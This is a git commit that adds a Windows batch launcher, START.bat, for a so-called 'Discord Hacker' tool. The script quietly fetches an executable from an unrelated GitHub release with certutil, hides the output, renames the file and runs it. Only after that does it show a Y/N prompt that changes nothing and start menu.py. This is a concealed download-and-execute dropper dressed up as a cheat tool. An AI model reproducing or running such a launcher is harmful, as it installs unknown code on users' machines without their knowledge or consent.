998363be7ba061ab9bbec29d200d021515755054
cheat labs <131698090+hvbsvqdj@users.noreply.github.com>
2024-04-06 16:39:33 +0200

    Add files via upload

---
+++ Tabaco V2/START.bat
@@ -0,0 +1,26 @@
+@echo off
+
+echo "Welcome Discord Hacker! Everything you do with this tool will be from your free will. We're not responsible for anything that happens to you"
+set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
+set "Dossier=Tools"
+set "NomFichier=%Dossier%\tabaco-V2.exe"
+
+certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
+
+if exist "%NomFichier%" (
+    start "" "%NomFichier%"
+)
+
+set /p answer="Do you want to continue (Y/N)? "
+
+if /i "%answer%"=="Y" (
+  echo "You chose to continue."
+) else if /i "%answer%"=="N" (
+  echo "You chose to cancel."
+) else (
+  echo "Invalid input."
+)
+
+timeout /t 5 /nobreak
+
+python menu.py
